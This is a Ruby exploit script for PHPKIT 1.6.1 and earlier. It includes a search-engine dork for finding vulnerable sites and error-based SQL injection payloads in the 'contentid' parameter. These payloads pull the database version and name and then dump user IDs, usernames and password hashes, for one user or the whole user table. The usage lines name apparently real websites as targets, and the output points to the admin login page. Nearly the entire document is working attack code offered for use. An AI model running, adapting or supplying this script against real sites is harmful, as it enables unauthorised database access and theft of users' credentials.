#!/usr/bin/env ruby
#
# HR's PHPKIT <= 1.6.1 SQLi Exploit Script
#
# DORK: intext:"PHPKIT Version 1.6.03 by moonrise"
#
# PIC: http://i.imgur.com/jLgC6.png
# PIC: http://i.imgur.com/Zb8h2.png
# PIC: http://i.imgur.com/fu5k5.png
# PIC: http://i.imgur.com/zw0Ug.png
#

require 'open-uri'
require 'optparse'
require 'rubygems'
require 'colorize'
require 'curb'

trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, Shutting things down and exiting program....".red ; exit 666; }

def cls
	if RUBY_PLATFORM =~ /win32/ 
		system('cls')
	else
		system('clear')
	end
end

def banner
	puts
	puts "\t\tPHPKIT <= 1.6.1 ".light_red
	puts "\n\tSQL Injection Exploit Script".light_red
	puts "\n\t\tBy: ".light_red + "Hood3dRob1n".light_green
end

def confirm(url)
	c = Curl::Easy.new(url) do |curl|
		curl.headers["User-Agent"]='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1'
	end
	c.perform
	if c.status =~ /200/
		puts			
		puts "Confirmed Site is up, checking injection vector now".light_blue + "............".white
		puts
	else
		puts
		puts "Site doesn't appear to be up".red + "!".white
		puts "Check provied URL and try again or confirm manually, sorry".red + "......".white
		puts
		puts
		exit 666;
	end
end

def injection(url, payload)
	urli = url + payload
	c = Curl::Easy.new(urli) do |curl|
		curl.headers["User-Agent"]='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1'
	end
	c.perform
	if c.status =~ /200/
		if c.body_str =~ /\[omg\](.+)\[omg\]/
			@result = $1
		end
	else
		puts
		puts "Injection doesn't seem to be working. Please check manually to confirm, sorry".red + ".......".white
		puts
		puts
		exit 666;
	end
end

options = {}
optparse = OptionParser.new do |opts| 
	opts.banner = "Usage:".light_red + "#{$0} ".white + "[".light_red + "OPTIONS".white + "]".light_red
	opts.separator ""
	opts.separator "EX:".light_red + " #{$0} -t \"http://www.site.de/include.php?path=content/content.php&contentid=22\" -p pk".white
	opts.separator "EX:".light_red + " #{$0} --target-url \"http://www.sanz.info/include.php?path=content/content.php&contentid=10\" -u admin".white
	opts.separator "EX:".light_red + " #{$0} -t \"http://www.passhaus.at/torzumneolithikum/include.php?path=content/content.php&contentid=22\" -p phpkits -u \"george bush\"".white

	opts.separator ""
	opts.separator "Options: ".light_red

	opts.on('-t', '--target-url <SITE>', "\n\tVuln link on PHPKIT Installation <= 1.6.1\n\t\t=> Vuln param is 'contentid' when path is set to 'content.php' page".white) do |target|
		options[:site] = target
	end

	opts.on('-p', '--prefix <PREFIX>', "\n\tDatabase Table Prefix to use, default is 'phpkit'".white) do |prefix|
		options[:fix] = prefix
	end

	opts.on('-u', '--username <PREFIX>', "\n\tDump credentials for specific username\n\t\t=> default dumps entire users table".white) do |prefix|
		@username = prefix
		options[:method] = 2
	end

	opts.on('-h', '--help', "\n\tHelp Menu".white) do 
		cls
		banner
		puts
		puts opts
		puts
		exit 69
	end
end

begin
	foo = ARGV[0] || ARGV[0] = "-h"
	optparse.parse!

	mandatory = [:site]
	missing = mandatory.select{ |param| options[param].nil? }
	if not missing.empty?
		puts "Missing options: ".red + " #{missing.join(', ')}".white  
		puts optparse
		exit
	end

	if options[:fix].nil?
		@prefix = "phpkit"
	else
		@prefix = "#{options[:fix]}"
	end

	if options[:method].nil?
		options[:method] = 1
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	cls
	banner
	puts
	puts $!.to_s.red
	puts
	puts optparse
	puts
	exit 666;
end

cls
banner
puts
puts

#Confirm Site is up before going in guns blazing.....
confirm(options[:site])

#Get Version
version=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT version()) ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")
injection(options[:site], version)
@version = @result
puts "Injection ".green + "=>".white + " Success".green + "!".white
puts
puts "Version: ".light_blue + "#{@version}".white

#Get Database
database=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT database()) ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")
injection(options[:site], database)
@db = @result
puts "Current Database: ".light_blue + "#{@db}".white

#Get Count of Users
countEntry=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT COUNT(user_name) FROM #{@db}.#{@prefix}_user) ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")
injection(options[:site], countEntry)
@usecount = @result
puts "Number of Users: ".light_blue + "#{@usecount}".white

#Dump based on options passed (2 => Single User vs 1 => ALL Users)
if options[:method].to_i == 2 #Get the info for supplied username....
		uid=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT uid FROM #{@db}.#{@prefix}_user WHERE user_name LIKE '%#{@username}%') ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")

		userPass=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT user_pw FROM #{@db}.#{@prefix}_user WHERE user_name LIKE '%#{@username}%' ) ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")

		injection(options[:site], uid)
		@user_id = @result
		injection(options[:site], userPass)
		@userPass = @result

		puts
		puts "UID: ".light_blue + "#{@user_id}".white
		puts "Username: ".light_blue + "#{@username}".white
		puts "Password: ".light_blue + "#{@userPass}".white
		puts
else
	puts
	count=0
	while count.to_i < @usecount.to_i #Loop until no more user enties exist....
		uid=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT uid FROM #{@db}.#{@prefix}_user LIMIT #{count},1) ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")

		userName=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT user_name FROM #{@db}.#{@prefix}_user LIMIT #{count},1 ) ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")

		userPass=URI.encode("' AND (SELECT 5252 FROM(SELECT COUNT(*),CONCAT(0x5b6f6d675d,(SELECT MID(((CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,7,7))) THEN (SELECT user_pw FROM #{@db}.#{@prefix}_user LIMIT #{count},1 ) ELSE 0 END)),1,50)),0x5b6f6d675d,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fuqu'='fuqu")

		injection(options[:site], uid)
		@user_id = @result
		injection(options[:site], userName)
		@userName = @result
		injection(options[:site], userPass)
		@userPass = @result

		puts "UID: ".light_blue + "#{@user_id}".white
		puts "Username: ".light_blue + "#{@userName}".white
		puts "Password: ".light_blue + "#{@userPass}".white
		puts

		count = count.to_i + 1
	end
end

puts "TYPICAL LOGIN: ".light_blue + "http://www.site.de/<".white + "pk".light_red + "|".white + "phpkit".light_red + ">/admin/admin.php".white
puts
puts "Hope you found what you were looking for".light_blue + "...........".white
puts
puts "Until next time, Enjoy!".light_blue
puts
#EOF
